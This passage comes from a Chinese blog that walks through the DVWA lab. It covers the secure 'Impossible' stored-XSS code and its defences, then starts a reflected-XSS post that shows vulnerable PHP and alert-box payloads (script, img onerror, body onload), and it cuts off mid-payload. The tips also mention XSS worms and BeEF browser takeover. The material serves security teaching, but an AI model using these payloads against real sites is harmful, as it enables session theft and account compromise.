] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护1：htmlspecialchars()编码 ★★★</span></span><br><span class="line">    <span class="comment">// htmlspecialchars() - 将特殊字符转换为HTML实体</span></span><br><span class="line">    <span class="comment">// ENT_QUOTES - 转换单引号和双引号</span></span><br><span class="line">    <span class="comment">// &#x27;UTF-8&#x27; - 字符编码</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 转换：</span></span><br><span class="line">    <span class="comment">// &lt; → &amp;lt;</span></span><br><span class="line">    <span class="comment">// &gt; → &amp;gt;</span></span><br><span class="line">    <span class="comment">// &amp; → &amp;amp;</span></span><br><span class="line">    <span class="comment">// &quot; → &amp;quot;</span></span><br><span class="line">    <span class="comment">// &#x27; → &amp;#039;</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护2：PDO预编译语句 ★★★</span></span><br><span class="line">    <span class="comment">// $db - PDO数据库连接对象</span></span><br><span class="line">    <span class="comment">// prepare() - 准备SQL语句</span></span><br><span class="line">    <span class="comment">// :name, :message - 命名参数占位符</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 作用：SQL结构和数据完全分离，防止SQL注入</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 绑定参数 ★★★</span></span><br><span class="line">    <span class="comment">// bindParam() - 将变量绑定到参数</span></span><br><span class="line">    <span class="comment">// PDO::PARAM_STR - 参数类型为字符串</span></span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 执行插入 ★★★</span></span><br><span class="line">    <span class="comment">// execute() - 执行预编译语句</span></span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 生成新的CSRF token ★★★</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>显示留言（同样使用htmlspecialchars）：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从数据库读取留言</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT comment, name FROM guestbook&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历显示</span></span><br><span class="line"><span class="keyword">while</span>( <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>() ) &#123;</span><br><span class="line">    <span class="comment">// ★★★ 关键：输出时也进行HTML编码 ★★★</span></span><br><span class="line">    <span class="comment">// 虽然存储时已编码，但最佳实践是输出时也编码</span></span><br><span class="line">    <span class="comment">// 这样即使数据库中存在恶意数据，也会被安全显示</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;comment&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;name&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$row</span>[ <span class="string">&#x27;name&#x27;</span> ] ) . <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;message&#x27;&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$row</span>[ <span class="string">&#x27;comment&#x27;</span> ] ) . <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
<ol>
<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
<li><strong>htmlspecialchars()</strong> - 输入时编码</li>
<li><strong>PDO预编译</strong> - 防止SQL注入</li>
<li><strong>输出时再次编码</strong> - 双重保险</li>
</ol>
<p><strong>工作流程：</strong></p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">htmlspecialchars()编码：</span><br><span class="line">&amp;<span class="literal">lt</span>;script&amp;<span class="literal">gt</span>;alert(<span class="string">&#x27;XSS&#x27;</span>)&amp;<span class="literal">lt</span>;/script&amp;<span class="literal">gt</span>;</span><br><span class="line"></span><br><span class="line">存入数据库：</span><br><span class="line">&amp;<span class="literal">lt</span>;script&amp;<span class="literal">gt</span>;alert(<span class="string">&#x27;XSS&#x27;</span>)&amp;<span class="literal">lt</span>;/script&amp;<span class="literal">gt</span>;</span><br><span class="line"></span><br><span class="line">从数据库读取：</span><br><span class="line">&amp;<span class="literal">lt</span>;script&amp;<span class="literal">gt</span>;alert(<span class="string">&#x27;XSS&#x27;</span>)&amp;<span class="literal">lt</span>;/script&amp;<span class="literal">gt</span>;</span><br><span class="line"></span><br><span class="line">再次htmlspecialchars()：</span><br><span class="line">&amp;<span class="literal">lt</span>;script&amp;<span class="literal">gt</span>;alert(<span class="string">&#x27;XSS&#x27;</span>)&amp;<span class="literal">lt</span>;/script&amp;<span class="literal">gt</span>;</span><br><span class="line"></span><br><span class="line">浏览器显示（纯文本）：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">不会执行脚本！</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被转义：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">攻击1：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">存储：<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line">显示：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>（文本）</span><br><span class="line">结果：失败</span><br><span class="line"></span><br><span class="line">攻击2：<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line">存储：<span class="symbol">&amp;lt;</span>img src=x onerror=alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span></span><br><span class="line">显示：<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>（文本）</span><br><span class="line">结果：失败</span><br><span class="line"></span><br><span class="line">攻击3：&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">存储：<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line">显示：&quot;<span class="symbol">&amp;gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>（文本）</span><br><span class="line">结果：失败</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-输入输出双重编码"><a href="#1-输入输出双重编码" class="headerlink" title="1. 输入输出双重编码"></a>1. 输入输出双重编码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输入时编码</span></span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>], ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存入数据库</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO comments (content) VALUES (:content)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$input</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出时再次编码（双重保险）</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT content FROM comments&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>], ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-使用专门的XSS过滤库"><a href="#2-使用专门的XSS过滤库" class="headerlink" title="2. 使用专门的XSS过滤库"></a>2. 使用专门的XSS过滤库</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML Purifier（推荐）</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;HTMLPurifier.auto.php&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span> = <span class="title class_">HTMLPurifier_Config</span>::<span class="title function_ invoke__">createDefault</span>();</span><br><span class="line"><span class="variable">$purifier</span> = <span class="keyword">new</span> <span class="title class_">HTMLPurifier</span>(<span class="variable">$config</span>);</span><br><span class="line"><span class="variable">$clean_html</span> = <span class="variable">$purifier</span>-&gt;<span class="title function_ invoke__">purify</span>(<span class="variable">$dirty_html</span>);</span><br></pre></td></tr></table></figure>

<h4 id="3-内容安全策略（CSP）"><a href="#3-内容安全策略（CSP）" class="headerlink" title="3. 内容安全策略（CSP）"></a>3. 内容安全策略（CSP）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置严格的CSP</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="4-HttpOnly和Secure-Cookie"><a href="#4-HttpOnly和Secure-Cookie" class="headerlink" title="4. HttpOnly和Secure Cookie"></a>4. HttpOnly和Secure Cookie</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防止XSS窃取Cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;session&#x27;</span>, <span class="variable">$value</span>, [</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;secure&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;samesite&#x27;</span> =&gt; <span class="string">&#x27;Strict&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><ol>
<li><strong>存储编码后的数据</strong> - 存入数据库前先编码</li>
<li><strong>输出时再次编码</strong> - 双重保险</li>
<li><strong>定期审计</strong> - 检查数据库中是否有恶意数据</li>
</ol>
<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><ol>
<li><strong>WAF规则</strong> - 检测XSS payload</li>
<li><strong>日志监控</strong> - 记录可疑输入</li>
<li><strong>定期扫描</strong> - 使用工具扫描XSS漏洞</li>
</ol>
<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>输入过滤</td>
<td>❌</td>
<td>strip_tags</td>
<td>strip_tags</td>
<td>htmlspecialchars</td>
</tr>
<tr>
<td>输出编码</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ htmlspecialchars</td>
</tr>
<tr>
<td>SQL防护</td>
<td>mysql_escape</td>
<td>mysqli_escape</td>
<td>mysqli_escape</td>
<td>PDO预编译</td>
</tr>
<tr>
<td>CSRF防护</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ Token</td>
</tr>
<tr>
<td>持久化</td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
<td>✅（但安全）</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>较难</td>
<td>难</td>
<td>不可能</td>
</tr>
<tr>
<td>影响范围</td>
<td>所有用户</td>
<td>所有用户</td>
<td>所有用户</td>
<td>无影响</td>
</tr>
</tbody></table>
<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>攻击演示：</strong></p>
<ol>
<li><strong>Low难度</strong> - 直接注入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li><strong>Medium难度</strong> - 尝试各种绕过（较难）</li>
<li><strong>High难度</strong> - 基本无法绕过strip_tags()</li>
<li><strong>Impossible难度</strong> - 完全安全</li>
</ol>
<p><strong>实战技巧：</strong></p>
<ul>
<li>存储型XSS影响所有用户，危害更大</li>
<li>优先测试管理员会访问的页面</li>
<li>可以结合CSRF进行自动化蠕虫攻击</li>
<li>使用BeEF可以完全控制受害者浏览器</li>
</ul>
<p><strong>防御重点：</strong></p>
<ul>
<li>输入输出都要编码</li>
<li>使用htmlspecialchars()而不是strip_tags()</li>
<li>设置HttpOnly Cookie</li>
<li>实施CSP策略</li>
</ul>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不传播XSS蠕虫到真实网站</li>
<li>学习目的是保护用户安全</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/XSS_Reflected_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/XSS_Reflected_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - XSS Reflected (反射型XSS) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:25:46" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是反射型XSS（Reflected-Cross-Site-Scripting）？"><a href="#什么是反射型XSS（Reflected-Cross-Site-Scripting）？" class="headerlink" title="什么是反射型XSS（Reflected Cross-Site Scripting）？"></a>什么是反射型XSS（Reflected Cross-Site Scripting）？</h3><p>反射型XSS是一种客户端代码注入攻击，攻击者将恶意脚本注入到URL参数或表单中，服务器将这些恶意内容”反射”回页面并在浏览器中执行。</p>
<p><strong>攻击流程：</strong></p>
<ol>
<li>攻击者构造包含恶意脚本的URL</li>
<li>受害者点击恶意链接</li>
<li>服务器将恶意脚本反射到响应页面</li>
<li>浏览器执行恶意脚本</li>
</ol>
<p><strong>危害：</strong></p>
<ul>
<li>窃取Cookie和Session</li>
<li>钓鱼攻击</li>
<li>键盘记录</li>
<li>篡改页面内容</li>
<li>重定向到恶意网站</li>
<li>传播蠕虫</li>
</ul>
<p><strong>与存储型XSS的区别：</strong></p>
<ul>
<li>反射型：恶意代码在URL中，不存储在服务器</li>
<li>存储型：恶意代码存储在数据库，持久化攻击</li>
</ul>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全未过滤的输入输出，直接执行用户脚本。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 声明HTTP响应头：字符集为UTF-8 ★★★</span></span><br><span class="line"><span class="comment">// header() - 发送原始HTTP头到客户端</span></span><br><span class="line"><span class="comment">// Content-Type - 指定内容类型</span></span><br><span class="line"><span class="comment">// text/html - HTML文档</span></span><br><span class="line"><span class="comment">// charset=utf-8 - 字符编码为UTF-8</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在且非NULL</span></span><br><span class="line"><span class="comment">// $_GET[&#x27;name&#x27;] - 从URL参数获取name的值</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接输出用户输入，无任何过滤！ ★★★</span></span><br><span class="line">    <span class="comment">// $_GET[ &#x27;name&#x27; ] - 获取用户输入的name参数</span></span><br><span class="line">    <span class="comment">// 例如：?name=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line">    <span class="comment">// 问题：没有任何HTML编码、过滤或验证</span></span><br><span class="line">    <span class="comment">// 用户输入的任何内容都会直接插入HTML中执行</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>直接输出用户输入</strong> - 没有任何过滤</li>
<li><strong>无HTML编码</strong> - 特殊字符<code>&lt;&gt;</code>不转义</li>
<li><strong>无内容安全策略</strong> - 允许执行任意脚本</li>
<li><strong>无输入验证</strong> - 接受任何字符</li>
</ol>
<p><strong>攻击原理：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 正常输入 --&gt;</span></span><br><span class="line">?name=Alice</span><br><span class="line">输出：<span class="tag">&lt;<span class="name">pre</span>&gt;</span>Hello Alice<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- XSS攻击 --&gt;</span></span><br><span class="line">?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">输出：<span class="tag">&lt;<span class="name">pre</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">结果：浏览器执行脚本，弹出XSS对话框</span><br></pre></td></tr></table></figure>

<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：基础测试"><a href="#步骤1：基础测试" class="headerlink" title="步骤1：基础测试"></a>步骤1：基础测试</h4><p><strong>测试1：简单弹窗</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 输入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 完整URL --&gt;</span></span><br><span class="line">http://dvwa.local/dvwa/vulnerabilities/xss_r/?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 结果 --&gt;</span></span><br><span class="line">页面弹出对话框显示&quot;XSS&quot;</span><br></pre></td></tr></table></figure>

<p><strong>测试2：大小写混淆</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果有简单过滤，尝试大小写 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>测试3：其他标签</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- img标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- body标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- svg标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span 